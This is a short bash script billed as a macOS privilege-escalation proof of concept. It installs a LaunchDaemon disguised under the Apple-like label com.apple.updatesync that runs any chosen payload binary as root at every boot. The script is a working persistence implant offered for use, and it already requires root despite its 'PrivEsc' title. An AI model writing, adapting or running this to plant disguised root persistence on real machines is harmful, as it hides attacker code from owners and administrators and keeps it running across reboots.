#!/bin/bash
# -----------------------------------------------------------------------------
# macOS LaunchDaemon PrivEsc PoC – Requires root
# Creates a LaunchDaemon that executes a root-level payload on system boot.
# Permit execution: chmod +x poc.sh
# Execute via: sudo ./poc.sh [--payload /path/to/binary]
#
# Author: SentinelByte
# Version: 1.02
# -----------------------------------------------------------------------------

set -euo pipefail

PLIST_NAME="com.apple.updatesync.plist"
PLIST_PATH="/Library/LaunchDaemons/$PLIST_NAME"
PAYLOAD="/usr/bin/whoami"  # default; override with --payload

while [[ $# -gt 0 ]]; do
    case "$1" in
        --payload) PAYLOAD="$2"; shift 2 ;;
        *) echo "Usage: sudo $0 [--payload /path/to/binary]" >&2; exit 1 ;;
    esac
done

# -----------------------------------------------------------------------------
# Write the LaunchDaemon plist
# -----------------------------------------------------------------------------

echo "[*] Writing LaunchDaemon plist to: $PLIST_PATH (requires sudo/root)"
cat > "$PLIST_PATH" <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
 "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.updatesync</string>

    <key>ProgramArguments</key>
    <array>
        <string>$PAYLOAD</string>
    </array>

    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
EOF

# -----------------------------------------------------------------------------
# Set proper permissions and load
# -----------------------------------------------------------------------------

echo "[*] Fixing permissions and ownership (must be root)"
sudo chown root:wheel "$PLIST_PATH"
sudo chmod 644 "$PLIST_PATH"

echo "[+] LaunchDaemon written."
echo "[*] Loading LaunchDaemon (executes as root):"
sudo launchctl load "$PLIST_PATH"
